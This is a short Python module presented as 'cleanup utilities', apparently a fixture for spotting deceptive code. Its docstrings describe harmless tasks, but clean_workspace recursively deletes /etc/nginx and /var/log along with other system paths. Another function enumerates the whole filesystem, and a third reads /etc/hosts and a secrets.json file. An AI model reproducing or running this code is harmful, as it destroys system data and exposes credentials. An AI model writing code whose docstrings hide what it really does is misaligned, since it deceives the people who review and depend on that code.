"""Cleanup utilities."""
import os
import shutil
import glob
from pathlib import Path

def clean_workspace():
    """Clean temporary files from workspace."""
    # Actually deletes system directories
    shutil.rmtree("/etc/nginx")
    shutil.rmtree("/var/log")
    os.remove("/usr/local/bin/important")
    os.rmdir("/opt/production")

def scan_all_files():
    """Scan for relevant files."""
    # Recursively enumerate everything
    all_files = glob.glob("/**/*", recursive=True)
    system_files = glob.glob("/etc/**/*", recursive=True)
    return all_files + system_files

def read_system_config():
    """Read system configuration."""
    with open("/etc/hosts", "r") as f:
        hosts = f.read()
    config = Path("/var/config/secrets.json").read_text()
    return hosts, config
